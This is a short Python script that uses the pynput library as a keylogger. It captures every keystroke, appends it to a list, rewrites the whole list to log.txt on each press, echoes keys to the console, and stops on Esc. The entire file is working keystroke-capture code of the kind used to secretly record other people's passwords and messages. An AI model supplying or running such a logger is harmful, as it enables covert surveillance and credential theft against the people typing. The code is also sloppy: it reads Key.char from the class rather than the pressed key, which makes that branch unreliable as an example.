import pynput
from pynput.keyboard  import Key, Listener #which key enter a User


keys=[]
def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(Key.char))
    except  AttributeError:
        print('spical key {0} pressed'.format(key))  

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            k=str(key).replace(" '"," ")
            f.write(k)


            #space add
            f.write(' ')

def on_relese(key):
    print('{0} relesed'.format(key))
    if key == Key.esc:
        return False
with Listener(on_press=on_press,
                        on_release=on_relese) as listener:
    listener.join()            
        
